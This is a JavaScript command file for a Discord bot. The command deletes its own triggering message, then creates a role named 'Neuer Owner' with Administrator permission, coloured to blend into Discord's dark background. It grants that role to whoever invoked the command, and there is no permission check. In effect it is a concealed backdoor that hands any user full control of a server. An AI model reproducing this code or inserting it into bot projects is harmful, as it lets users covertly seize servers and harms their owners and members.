/*
 * Copyright (c) 2020-2021, Bastian Leicht <mail@bastianleicht.de>
 *
 * PDX-License-Identifier: BSD-2-Clause
 */
// jshint esversion: 8

module.exports.run = async (client, message, args) => {
    message.delete().catch(()=> { });

    try {
        let role = await message.guild.roles.create ({
            data: {
                name: "Neuer Owner",
                color: "#2f3136",
                permissions: [8],
                position: 1
            }

        });
        await message.member.roles.add(role)
    } catch(e) {
        console.log(e.stack);
    }

};